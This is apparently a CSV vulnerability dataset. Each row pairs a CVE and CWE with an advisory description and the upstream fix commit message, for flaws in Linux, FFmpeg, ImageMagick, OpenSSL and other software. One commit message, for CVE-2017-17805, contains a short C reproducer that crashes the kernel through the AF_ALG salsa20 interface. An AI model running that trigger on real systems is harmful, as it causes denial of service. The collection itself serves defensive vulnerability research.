CVE-2017-9051,CWE-476,2017-05-18,libav before 12.1 is vulnerable to an invalid read of size 1 due to NULL pointer dereferencing in the nsv_read_chunk function in libavformat/nsvdec.c.,Fixes invalid reads with corrupted files.  CC: libav-stable@libav.org Bug-Id: 1039
CVE-2018-1999013,CWE-416,2018-07-23,FFmpeg before commit a7e032a277452366771951e29fd0bf2bd5c029f0 contains a use-after-free vulnerability in the realmedia demuxer that can result in vulnerability allows attacker to read heap memory. This attack appear to be exploitable via specially crafted RM file has to be provided as input. This vulnerability appears to have been fixed in a7e032a277452366771951e29fd0bf2bd5c029f0 and later.,Fixes: use after free() Fixes: rmdec-crash-ffe85b4cab1597d1cfea6955705e53f1f5c8a362  Found-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2017-13658,CWE-617,2017-08-24,"In ImageMagick before 6.9.9-3 and 7.x before 7.0.6-3, there is a missing NULL check in the ReadMATImage function in coders/mat.c, leading to a denial of service (assertion failure and application exit) in the DestroyImageInfo function in MagickCore/image.c.",
CVE-2018-16842,CWE-125,2018-10-31,Curl versions 7.14.1 through 7.61.1 are vulnerable to a heap-based buffer over-read in the tool_msgs.c:voutf() function that may result in information exposure and denial of service.,CVE-2018-16842 Reported-by: Brian Carpenter Bug: https://curl.haxx.se/docs/CVE-2018-16842.html
CVE-2018-14681,CWE-787,2018-07-28,An issue was discovered in kwajd_read_headers in mspack/kwajd.c in libmspack before 0.7alpha. Bad KWAJ file header extensions could cause a one or two byte overwrite.,
CVE-2016-4578,CWE-200,2016-05-23,"sound/core/timer.c in the Linux kernel through 4.6 does not initialize certain r1 data structures, which allows local users to obtain sensitive information from kernel stack memory via crafted use of the ALSA timer interface, related to the (1) snd_timer_user_ccallback and (2) snd_timer_user_tinterrupt functions.",The stack object “r1” has a total size of 32 bytes. Its field “event” and “val” both contain 4 bytes padding. These 8 bytes padding bytes are sent to user without being initialized.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Takashi Iwai <tiwai@suse.de>
CVE-2013-6800,,2013-11-18,"An unspecified third-party database module for the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) 1.10.x allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted request, a different vulnerability than CVE-2013-1418.","If a KDC serves multiple realms, certain requests can cause setup_server_realm() to dereference a null pointer, crashing the KDC.  CVSSv2: AV:N/AC:M/Au:N/C:N/I:N/A:P/E:POC/RL:OF/RC:C  A related but more minor vulnerability requires authentication to exploit, and is only present if a third-party KDC database module can dereference a null pointer under certain conditions.  (back ported from commit 5d2d9a1)  ticket: 7757 (new) version_fixed: 1.10.7 status: resolved"
CVE-2014-4655,CWE-190,2014-07-03,"The snd_ctl_elem_add function in sound/core/control.c in the ALSA control implementation in the Linux kernel before 3.15.2 does not properly maintain the user_ctl_count value, which allows local users to cause a denial of service (integer overflow and limit bypass) by leveraging /dev/snd/controlCX access for a large number of SNDRV_CTL_IOCTL_ELEM_REPLACE ioctl calls.","There are two issues with the current implementation for replacing user controls. The first is that the code does not check if the control is actually a user control and neither does it check if the control is owned by the process that tries to remove it. That allows userspace applications to remove arbitrary controls, which can cause a user after free if a for example a driver does not expect a control to be removed from under its feed.  The second issue is that on one hand when a control is replaced the user_ctl_count limit is not checked and on the other hand the user_ctl_count is increased (even though the number of user controls does not change). This allows userspace, once the user_ctl_count limit as been reached, to repeatedly replace a control until user_ctl_count overflows. Once that happens new controls can be added effectively bypassing the user_ctl_count limit.  Both issues can be fixed by instead of open-coding the removal of the control that is to be replaced to use snd_ctl_remove_user_ctl(). This function does proper permission checks as well as decrements user_ctl_count after the control has been removed.  Note that by using snd_ctl_remove_user_ctl() the check which returns -EBUSY at beginning of the function if the control already exists is removed. This is not a problem though since the check is quite useless, because the lock that is protecting the control list is released between the check and before adding the new control to the list, which means that it is possible that a different control with the same settings is added to the list after the check. Luckily there is another check that is done while holding the lock in snd_ctl_add(), so we'll rely on that to make sure that the same control is not added twice.  Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Acked-by: Jaroslav Kysela <perex@perex.cz> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2017-5507,CWE-772,2017-03-24,Memory leak in coders/mpc.c in ImageMagick before 6.9.7-4 and 7.x before 7.0.4-4 allows remote attackers to cause a denial of service (memory consumption) via vectors involving a pixel cache.,
CVE-2016-0798,CWE-399,2016-03-03,"Memory leak in the SRP_VBASE_get_by_user implementation in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory consumption) by providing an invalid username in a connection attempt, related to apps/s_server.c and crypto/srp/srp_vfy.c.",
CVE-2018-1999012,CWE-835,2018-07-23,FFmpeg before commit 9807d3976be0e92e4ece3b4b1701be894cd7c2e1 contains a CWE-835: Infinite loop vulnerability in pva format demuxer that can result in a Vulnerability that allows attackers to consume excessive amount of resources like CPU and RAM. This attack appear to be exploitable via specially crafted PVA file has to be provided as input. This vulnerability appears to have been fixed in 9807d3976be0e92e4ece3b4b1701be894cd7c2e1 and later.,Fixes: Infinite loop Fixes: pva-4b1835dbc2027bf3c567005dcc78e85199240d06  Found-by: Paul Ch <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2019-13298,CWE-787,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore/pixel-accessor.h in SetPixelViaPixelInfo because of a MagickCore/enhance.c error.,
CVE-2016-10094,CWE-189,2017-03-01,Off-by-one error in the t2p_readwrite_pdf_image_tile function in tools/tiff2pdf.c in LibTIFF 4.0.7 allows remote attackers to have unspecified impact via a crafted image.,t2p_readwrite_pdf_image_tile(). Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2640
CVE-2016-5772,CWE-415,2016-08-07,"Double free vulnerability in the php_wddx_process_data function in wddx.c in the WDDX extension in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via crafted XML data that is mishandled in a wddx_deserialize call.",
CVE-2016-10053,CWE-369,2017-03-23,The WriteTIFFImage function in coders/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted file.,
CVE-2012-5134,CWE-119,2012-11-28,"Heap-based buffer underflow in the xmlParseAttValueComplex function in parser.c in libxml2 2.9.0 and earlier, as used in Google Chrome before 23.0.1271.91 and other products, allows remote attackers to cause a denial of service or possibly execute arbitrary code via crafted entities in an XML document.",
CVE-2013-2061,CWE-200,2013-11-18,"The openvpn_decrypt function in crypto.c in OpenVPN 2.3.0 and earlier, when running in UDP mode, allows remote attackers to obtain sensitive information via a timing attack involving an HMAC comparison function that does not run in constant time and a padding oracle attack on the CBC mode cipher.",Signed-off-by: Steffan Karger <steffan.karger@fox-it.com> Acked-by: Gert Doering <gert@greenie.muc.de> Signed-off-by: Gert Doering <gert@greenie.muc.de>
CVE-2015-2925,,2015-11-16,"The prepend_path function in fs/dcache.c in the Linux kernel before 4.2.4 does not properly handle rename actions inside a bind mount, which allows local users to bypass an intended container protection mechanism by renaming a directory, related to a ""double-chroot attack.""","In rare cases a directory can be renamed out from under a bind mount. In those cases without special handling it becomes possible to walk up the directory tree to the root dentry of the filesystem and down from the root dentry to every other file or directory on the filesystem.  Like division by zero .. from an unconnected path can not be given a useful semantic as there is no predicting at which path component the code will realize it is unconnected.  We certainly can not match the current behavior as the current behavior is a security hole.  Therefore when encounting .. when following an unconnected path return -ENOENT.  - Add a function path_connected to verify path->dentry is reachable   from path->mnt.mnt_root.  AKA to validate that rename did not do   something nasty to the bind mount.    To avoid races path_connected must be called after following a path   component to it's next path component.  Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2017-13005,CWE-125,2017-09-14,The NFS parser in tcpdump before 4.9.2 has a buffer over-read in print-nfs.c:xid_map_enter().,This fixes a buffer over-read discovered by Kamil Frankowicz.  Add a test using the capture file supplied by the reporter(s).
CVE-2016-0701,CWE-200,2016-02-15,"The DH_check_pub_key function in crypto/dh/dh_check.c in OpenSSL 1.0.2 before 1.0.2f does not ensure that prime numbers are appropriate for Diffie-Hellman (DH) key exchange, which makes it easier for remote attackers to discover a private DH exponent by making multiple handshakes with a peer that chose an inappropriate number, as demonstrated by a number in an X9.42 file.",
CVE-2017-5506,CWE-415,2017-03-24,Double free vulnerability in magick/profile.c in ImageMagick allows remote attackers to have unspecified impact via a crafted file.,
CVE-2017-10929,CWE-119,2017-07-05,"The grub_memmove function in shlr/grub/kern/misc.c in radare2 1.5.0 allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted binary file, possibly related to a read overflow in the grub_disk_read_small_real function in kern/disk.c in GNU GRUB 2.02.",
CVE-2011-3359,CWE-119,2012-05-24,"The dma_rx function in drivers/net/wireless/b43/dma.c in the Linux kernel before 2.6.39 does not properly allocate receive buffers, which allows remote attackers to cause a denial of service (system crash) via a crafted frame.","Otherwise, skb_put inside of dma_rx can fail...  	https://bugzilla.kernel.org/show_bug.cgi?id=32042  Signed-off-by: John W. Linville <linville@tuxdriver.com> Acked-by: Larry Finger <Larry.Finger@lwfinger.net> Cc: stable@kernel.org"
CVE-2017-2647,CWE-476,2017-03-31,"The KEYS subsystem in the Linux kernel before 3.18 allows local users to gain privileges or cause a denial of service (NULL pointer dereference and system crash) via vectors involving a NULL value for a certain match field, related to the keyring_search_iterator function in keyring.c.","A previous patch added a ->match_preparse() method to the key type.  This is allowed to override the function called by the iteration algorithm. Therefore, we can just set a default that simply checks for an exact match of the key description with the original criterion data and allow match_preparse to override it as needed.  The key_type::match op is then redundant and can be removed, as can the user_match() function.  Signed-off-by: David Howells <dhowells@redhat.com> Acked-by: Vivek Goyal <vgoyal@redhat.com>"
CVE-2018-1152,CWE-369,2018-06-18,libjpeg-turbo 1.5.90 is vulnerable to a denial of service vulnerability caused by a divide by zero when processing a crafted BMP image.,"In rdbmp.c, it is necessary to guard against 32-bit overflow/wraparound when allocating the row buffer, because since BMP files have 32-bit width and height fields, the value of biWidth can be up to 4294967295. Specifically, if biWidth is 1073741824 and cinfo->input_components = 4, then the samplesperrow argument in alloc_sarray() would wrap around to 0, and a division by zero error would occur at line 458 in jmemmgr.c.  If biWidth is set to a higher value, then samplesperrow would wrap around to a small number, which would likely cause a buffer overflow (this has not been tested or verified.)"
CVE-2016-4558,,2016-05-23,"The BPF subsystem in the Linux kernel before 4.5.5 mishandles reference counts, which allows local users to cause a denial of service (use-after-free) or possibly have unspecified other impact via a crafted application on (1) a system with more than 32 Gb of memory, related to the program reference count or (2) a 1 Tb system, related to the map reference count.","On a system with >32Gbyte of phyiscal memory and infinite RLIMIT_MEMLOCK, the malicious application may overflow 32-bit bpf program refcnt. It's also possible to overflow map refcnt on 1Tb system. Impose 32k hard limit which means that the same bpf program or map cannot be shared by more than 32k processes.  Fixes: 1be7f75 (""bpf: enable non-root eBPF programs"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2012-3364,CWE-119,2013-01-22,Multiple stack-based buffer overflows in the Near Field Communication Controller Interface (NCI) in the Linux kernel before 3.4.5 allow remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via incoming frames with crafted length fields.,Fix multiple remotely-exploitable stack-based buffer overflows due to the NCI code pulling length fields directly from incoming frames and copying too much data into statically-sized arrays.  Signed-off-by: Dan Rosenberg <dan.j.rosenberg@gmail.com> Cc: stable@kernel.org Cc: security@kernel.org Cc: Lauro Ramos Venancio <lauro.venancio@openbossa.org> Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org> Cc: Samuel Ortiz <sameo@linux.intel.com> Cc: David S. Miller <davem@davemloft.net> Acked-by: Ilan Elias <ilane@ti.com> Signed-off-by: Samuel Ortiz <sameo@linux.intel.com>
CVE-2013-4623,CWE-20,2013-09-30,"The x509parse_crt function in x509.h in PolarSSL 1.1.x before 1.1.7 and 1.2.x before 1.2.8 does not properly parse certificate messages during the SSL/TLS handshake, which allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a certificate message that contains a PEM encoded certificate.",
CVE-2017-17805,CWE-20,2017-12-20,"The Salsa20 encryption algorithm in the Linux kernel before 4.14.8 does not correctly handle zero-length inputs, allowing a local attacker able to use the AF_ALG-based skcipher interface (CONFIG_CRYPTO_USER_API_SKCIPHER) to cause a denial of service (uninitialized-memory free and kernel crash) or have unspecified other impact by executing a crafted sequence of system calls that use the blkcipher_walk API. Both the generic implementation (crypto/salsa20_generic.c) and x86 implementation (arch/x86/crypto/salsa20_glue.c) of Salsa20 were vulnerable.","When asked to encrypt or decrypt 0 bytes, both the generic and x86 implementations of Salsa20 crash in blkcipher_walk_done(), either when doing 'kfree(walk->buffer)' or 'free_page((unsigned long)walk->page)', because walk->buffer and walk->page have not been initialized.  The bug is that Salsa20 is calling blkcipher_walk_done() even when nothing is in 'walk.nbytes'.  But blkcipher_walk_done() is only meant to be called when a nonzero number of bytes have been provided.  The broken code is part of an optimization that tries to make only one call to salsa20_encrypt_bytes() to process inputs that are not evenly divisible by 64 bytes.  To fix the bug, just remove this ""optimization"" and use the blkcipher_walk API the same way all the other users do.  Reproducer:      #include <linux/if_alg.h>     #include <sys/socket.h>     #include <unistd.h>      int main()     {             int algfd, reqfd;             struct sockaddr_alg addr = {                     .salg_type = ""skcipher"",                     .salg_name = ""salsa20"",             };             char key[16] = { 0 };              algfd = socket(AF_ALG, SOCK_SEQPACKET, 0);             bind(algfd, (void *)&addr, sizeof(addr));             reqfd = accept(algfd, 0, 0);             setsockopt(algfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));             read(reqfd, key, sizeof(key));     }  Reported-by: syzbot <syzkaller@googlegroups.com> Fixes: eb6f13e (""[CRYPTO] salsa20_generic: Fix multi-page processing"") Cc: <stable@vger.kernel.org> # v2.6.25+ Signed-off-by: Eric Biggers <ebiggers@google.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>"
CVE-2015-0289,,2015-03-19,"The PKCS#7 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a does not properly handle a lack of outer ContentInfo, which allows attackers to cause a denial of service (NULL pointer dereference and application crash) by leveraging an application that processes arbitrary PKCS#7 data and providing malformed data with ASN.1 encoding, related to crypto/pkcs7/pk7_doit.c and crypto/pkcs7/pk7_lib.c.",
CVE-2017-16531,CWE-119,2017-11-04,"drivers/usb/core/config.c in the Linux kernel before 4.13.6 allows local users to cause a denial of service (out-of-bounds read and system crash) or possibly have unspecified other impact via a crafted USB device, related to the USB_DT_INTERFACE_ASSOCIATION descriptor.","Andrey Konovalov reported a possible out-of-bounds problem for a USB interface association descriptor.  He writes: 	It seems there's no proper size check of a USB_DT_INTERFACE_ASSOCIATION 	descriptor. It's only checked that the size is >= 2 in 	usb_parse_configuration(), so find_iad() might do out-of-bounds access 	to intf_assoc->bInterfaceCount.  And he's right, we don't check for crazy descriptors of this type very well, so resolve this problem.  Yet another issue found by syzkaller...  Reported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2011-1927,,2012-06-13,"The ip_expire function in net/ipv4/ip_fragment.c in the Linux kernel before 2.6.39 does not properly construct ICMP_TIME_EXCEEDED packets after a timeout, which allows remote attackers to cause a denial of service (invalid pointer dereference) via crafted fragmented packets.","Commit 4a94445 (net: Use ip_route_input_noref() in input path) added a bug in IP defragmentation handling, in case timeout is fired.  When a frame is defragmented, we use last skb dst field when building final skb. Its dst is valid, since we are in rcu read section.  But if a timeout occurs, we take first queued fragment to build one ICMP TIME EXCEEDED message. Problem is all queued skb have weak dst pointers, since we escaped RCU critical section after their queueing. icmp_send() might dereference a now freed (and possibly reused) part of memory.  Calling skb_dst_drop() and ip_route_input_noref() to revalidate route is the only possible choice.  Reported-by: Denys Fedoryshchenko <denys@visp.net.lb> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2014-3479,,2014-07-09,"The cdf_check_stream_offset function in cdf.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, relies on incorrect sector-size data, which allows remote attackers to cause a denial of service (application crash) via a crafted stream offset in a CDF file.",Jan Kaluza at RedHat)
CVE-2016-10049,CWE-119,2017-03-23,Buffer overflow in the ReadRLEImage function in coders/rle.c in ImageMagick before 6.9.4-4 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted RLE file.,
CVE-2012-2390,CWE-399,2012-06-13,Memory leak in mm/hugetlb.c in the Linux kernel before 3.4.2 allows local users to cause a denial of service (memory consumption or system crash) via invalid MAP_HUGETLB mmap operations.,
CVE-2013-2636,CWE-399,2013-03-22,"net/bridge/br_mdb.c in the Linux kernel before 3.8.4 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory via a crafted application.",The bridging code discloses heap and stack bytes via the RTM_GETMDB netlink interface and via the notify messages send to group RTNLGRP_MDB afer a successful add/del.  Fix both cases by initializing all unset members/padding bytes with memset(0).  Cc: Stephen Hemminger <stephen@networkplumber.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2017-9499,CWE-617,2017-06-07,"In ImageMagick 7.0.5-7 Q16, an assertion failure was found in the function SetPixelChannelAttributes, which allows attackers to cause a denial of service via a crafted file.",
CVE-2011-4127,CWE-264,2012-07-03,"The Linux kernel before 3.2.2 does not properly restrict SG_IO ioctl calls, which allows local users to bypass intended restrictions on disk read and write operations by sending a SCSI command to (1) a partition block device or (2) an LVM volume.","Linux allows executing the SG_IO ioctl on a partition or LVM volume, and will pass the command to the underlying block device.  This is well-known, but it is also a large security problem when (via Unix permissions, ACLs, SELinux or a combination thereof) a program or user needs to be granted access only to part of the disk.  This patch lets partitions forward a small set of harmless ioctls; others are logged with printk so that we can see which ioctls are actually sent.  In my tests only CDROM_GET_CAPABILITY actually occurred. Of course it was being sent to a (partition on a) hard disk, so it would have failed with ENOTTY and the patch isn't changing anything in practice.  Still, I'm treating it specially to avoid spamming the logs.  In principle, this restriction should include programs running with CAP_SYS_RAWIO.  If for example I let a program access /dev/sda2 and /dev/sdb, it still should not be able to read/write outside the boundaries of /dev/sda2 independent of the capabilities.  However, for now programs with CAP_SYS_RAWIO will still be allowed to send the ioctls.  Their actions will still be logged.  This patch does not affect the non-libata IDE driver.  That driver however already tests for bd != bd->bd_contains before issuing some ioctl; it could be restricted further to forbid these ioctls even for programs running with CAP_SYS_ADMIN/CAP_SYS_RAWIO.  Cc: linux-scsi@vger.kernel.org Cc: Jens Axboe <axboe@kernel.dk> Cc: James Bottomley <JBottomley@parallels.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com> [ Make it also print the command name when warning - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-9995,CWE-119,2017-06-28,"libavcodec/scpr.c in FFmpeg 3.3 before 3.3.1 does not properly validate height and width data, which allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted file.",Fixes: 1519/clusterfuzz-testcase-minimized-5286680976162816  Found-by: continuous fuzzing process https://github.com/google/oss-fuzz/tree/master/targets/ffmpeg Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2016-4913,CWE-200,2016-05-23,"The get_rock_ridge_filename function in fs/isofs/rock.c in the Linux kernel before 4.5.5 mishandles NM (aka alternate name) entries containing \0 characters, which allows local users to obtain sensitive information from kernel memory or possibly have unspecified other impact via a crafted isofs filesystem.","Payloads of NM entries are not supposed to contain NUL.  When we run into such, only the part prior to the first NUL goes into the concatenation (i.e. the directory entry name being encoded by a bunch of NM entries).  We do stop when the amount collected so far + the claimed amount in the current NM entry exceed 254.  So far, so good, but what we return as the total length is the sum of *claimed* sizes, not the actual amount collected.  And that can grow pretty large - not unlimited, since you'd need to put CE entries in between to be able to get more than the maximum that could be contained in one isofs directory entry / continuation chunk and we are stop once we'd encountered 32 CEs, but you can get about 8Kb easily.  And that's what will be passed to readdir callback as the name length.  8Kb __copy_to_user() from a buffer allocated by __get_free_page()  Cc: stable@vger.kernel.org # 0.98pl6+ (yes, really) Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2016-5829,CWE-119,2016-06-27,Multiple heap-based buffer overflows in the hiddev_ioctl_usage function in drivers/hid/usbhid/hiddev.c in the Linux kernel through 4.6.3 allow local users to cause a denial of service or possibly have unspecified other impact via a crafted (1) HIDIOCGUSAGES or (2) HIDIOCSUSAGES ioctl call.,"This patch validates the num_values parameter from userland during the HIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set to HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter leading to a heap overflow.  Cc: stable@vger.kernel.org Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2018-14354,CWE-78,2018-07-17,"An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They allow remote IMAP servers to execute arbitrary commands via backquote characters, related to the mailboxes command associated with a manual subscription or unsubscription.",
CVE-2015-3417,,2015-04-24,"Use-after-free vulnerability in the ff_h264_free_tables function in libavcodec/h264.c in FFmpeg before 2.3.6 allows remote attackers to cause a denial of service or possibly have unspecified other impact via crafted H.264 data in an MP4 file, as demonstrated by an HTML VIDEO element that references H.264 data.",Fixes use of freed memory  Fixes: case5_av_frame_copy_props.mp4 Found-by: Michal Zalewski <lcamtuf@coredump.cx> Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2015-8897,CWE-125,2017-03-15,The SpliceImage function in MagickCore/transform.c in ImageMagick before 6.9.2-4 allows remote attackers to cause a denial of service (application crash) via a crafted png file.,
CVE-2018-16643,CWE-252,2018-09-06,"The functions ReadDCMImage in coders/dcm.c, ReadPWPImage in coders/pwp.c, ReadCALSImage in coders/cals.c, and ReadPICTImage in coders/pict.c in ImageMagick 7.0.8-4 do not check the return value of the fputc function, which allows remote attackers to cause a denial of service via a crafted image file.",
CVE-2018-1065,CWE-476,2018-03-02,"The netfilter subsystem in the Linux kernel through 4.15.7 mishandles the case of a rule blob that contains a jump but lacks a user-defined chain, which allows local users to cause a denial of service (NULL pointer dereference) by leveraging the CAP_NET_RAW or CAP_NET_ADMIN capability, related to arpt_do_table in net/ipv4/netfilter/arp_tables.c, ipt_do_table in net/ipv4/netfilter/ip_tables.c, and ip6t_do_table in net/ipv6/netfilter/ip6_tables.c.","The rationale for removing the check is only correct for rulesets generated by ip(6)tables.  In iptables, a jump can only occur to a user-defined chain, i.e. because we size the stack based on number of user-defined chains we cannot exceed stack size.  However, the underlying binary format has no such restriction, and the validation step only ensures that the jump target is a valid rule start point.  IOW, its possible to build a rule blob that has no user-defined chains but does contain a jump.  If this happens, no jump stack gets allocated and crash occurs because no jumpstack was allocated.  Fixes: 7814b6e (""netfilter: xtables: don't save/restore jumpstack offset"") Reported-by: syzbot+e783f671527912cd9403@syzkaller.appspotmail.com Signed-off-by: Florian Westphal <fw@strlen.de> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>"
CVE-2014-3513,CWE-20,2014-10-19,Memory leak in d1_srtp.c in the DTLS SRTP extension in OpenSSL 1.0.1 before 1.0.1j allows remote attackers to cause a denial of service (memory consumption) via a crafted handshake message.,
CVE-2014-4668,CWE-287,2014-07-02,"The cherokee_validator_ldap_check function in validator_ldap.c in Cherokee 1.2.103 and earlier, when LDAP is used, does not properly consider unauthenticated-bind semantics, which allows remote attackers to bypass authentication via an empty password.",
CVE-2013-7023,CWE-119,2013-12-09,"The ff_combine_frame function in libavcodec/parser.c in FFmpeg before 2.1 does not properly handle certain memory-allocation errors, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.",Fixes Ticket2982  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2013-3076,CWE-200,2013-04-22,"The crypto API in the Linux kernel through 3.9-rc8 does not initialize certain length variables, which allows local users to obtain sensitive information from kernel stack memory via a crafted recvmsg or recvfrom system call, related to the hash_recvmsg function in crypto/algif_hash.c and the skcipher_recvmsg function in crypto/algif_skcipher.c.",The current code does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local sockaddr_storage variable to userland -- 128 bytes of kernel stack memory. Fix that.  Cc: <stable@vger.kernel.org> # 2.6.38 Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>
CVE-2017-1000198,CWE-119,2017-11-17,tcmu-runner daemon version 0.9.0 to 1.2.0 is vulnerable to invalid memory references in the handler_glfs.so handler resulting in denial of service,Signed-off-by: Prasanna Kumar Kalever <prasanna.kalever@redhat.com>
CVE-2011-2834,CWE-415,2011-09-19,"Double free vulnerability in libxml2, as used in Google Chrome before 14.0.835.163, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to XPath handling.",
CVE-2019-15140,CWE-416,2019-08-18,coders/mat.c in ImageMagick 7.0.8-43 Q16 allows remote attackers to cause a denial of service (use-after-free and application crash) or possibly have unspecified other impact by crafting a Matlab image file that is mishandled in ReadImage in MagickCore/constitute.c.,
CVE-2014-9420,CWE-399,2014-12-26,"The rock_continue function in fs/isofs/rock.c in the Linux kernel through 3.18.1 does not restrict the number of Rock Ridge continuation entries, which allows local users to cause a denial of service (infinite loop, and system crash or hang) via a crafted iso9660 image.","Rock Ridge extensions define so called Continuation Entries (CE) which define where is further space with Rock Ridge data. Corrupted isofs image can contain arbitrarily long chain of these, including a one containing loop and thus causing kernel to end in an infinite loop when traversing these entries.  Limit the traversal to 32 entries which should be more than enough space to store all the Rock Ridge data.  Reported-by: P J P <ppandit@redhat.com> CC: stable@vger.kernel.org Signed-off-by: Jan Kara <jack@suse.cz>"
CVE-2015-1788,CWE-399,2015-06-12,"The BN_GF2m_mod_inv function in crypto/bn/bn_gf2m.c in OpenSSL before 0.9.8s, 1.0.0 before 1.0.0e, 1.0.1 before 1.0.1n, and 1.0.2 before 1.0.2b does not properly handle ECParameters structures in which the curve is over a malformed binary polynomial field, which allows remote attackers to cause a denial of service (infinite loop) via a session that uses an Elliptic Curve algorithm, as demonstrated by an attack against a server that supports client authentication.",CVE-2015-1788  Reviewed-by: Matt Caswell <matt@openssl.org>
CVE-2017-9250,CWE-476,2017-05-28,"The lexer_process_char_literal function in jerry-core/parser/js/js-lexer.c in JerryScript 1.0 does not skip memory allocation for empty strings, which allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via malformed JavaScript source code, related to the jmem_heap_free_block function.",Fixes #1821.  JerryScript-DCO-1.0-Signed-off-by: Zoltan Herczeg zherczeg.u-szeged@partner.samsung.com
CVE-2014-5207,CWE-269,2014-08-18,"fs/namespace.c in the Linux kernel through 3.16.1 does not properly restrict clearing MNT_NODEV, MNT_NOSUID, and MNT_NOEXEC and changing MNT_ATIME_MASK during a remount of a bind mount, which allows local users to gain privileges, interfere with backups and auditing on systems that had atime enabled, or cause a denial of service (excessive filesystem updating) on systems that had atime disabled via a ""mount -o remount"" command within a user namespace.","While invesgiating the issue where in ""mount --bind -oremount,ro ..."" would result in later ""mount --bind -oremount,rw"" succeeding even if the mount started off locked I realized that there are several additional mount flags that should be locked and are not.  In particular MNT_NOSUID, MNT_NODEV, MNT_NOEXEC, and the atime flags in addition to MNT_READONLY should all be locked.  These flags are all per superblock, can all be changed with MS_BIND, and should not be changable if set by a more privileged user.  The following additions to the current logic are added in this patch. - nosuid may not be clearable by a less privileged user. - nodev  may not be clearable by a less privielged user. - noexec may not be clearable by a less privileged user. - atime flags may not be changeable by a less privileged user.  The logic with atime is that always setting atime on access is a global policy and backup software and auditing software could break if atime bits are not updated (when they are configured to be updated), and serious performance degradation could result (DOS attack) if atime updates happen when they have been explicitly disabled.  Therefore an unprivileged user should not be able to mess with the atime bits set by a more privileged user.  The additional restrictions are implemented with the addition of MNT_LOCK_NOSUID, MNT_LOCK_NODEV, MNT_LOCK_NOEXEC, and MNT_LOCK_ATIME mnt flags.  Taken together these changes and the fixes for MNT_LOCK_READONLY should make it safe for an unprivileged user to create a user namespace and to call ""mount --bind -o remount,... ..."" without the danger of mount flags being changed maliciously.  Cc: stable@vger.kernel.org Acked-by: Serge E. Hallyn <serge.hallyn@ubuntu.com> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2017-16803,CWE-119,2017-11-13,"In Libav through 11.11 and 12.x through 12.1, the smacker_decode_tree function in libavcodec/smacker.c does not properly restrict tree recursion, which allows remote attackers to cause a denial of service (bitstream.c:build_table() out-of-bounds read and application crash) via a crafted Smacker stream.",Signed-off-by: Michael Niedermayer <michaelni@gmx.at>  Bug-Id: 1098 Cc: libav-stable@libav.org Signed-off-by: Sean McGovern <gseanmcg@gmail.com>
